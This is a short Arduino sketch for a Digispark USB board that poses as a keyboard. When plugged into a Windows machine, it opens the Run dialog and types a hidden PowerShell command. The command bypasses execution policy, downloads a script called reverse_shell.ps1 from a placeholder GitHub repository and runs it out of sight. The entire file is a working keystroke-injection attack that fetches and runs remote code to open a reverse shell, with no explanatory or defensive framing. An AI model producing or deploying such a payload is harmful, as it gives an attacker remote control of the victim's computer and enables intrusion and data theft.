#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  // Win + R
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/seu-usuario/seu-repositorio/main/reverse_shell.ps1' -OutFile $env:TEMP\\reverse_shell.ps1; Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File $env:TEMP\\reverse_shell.ps1' -WindowStyle Hidden\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // Nothing to do in the loop
}
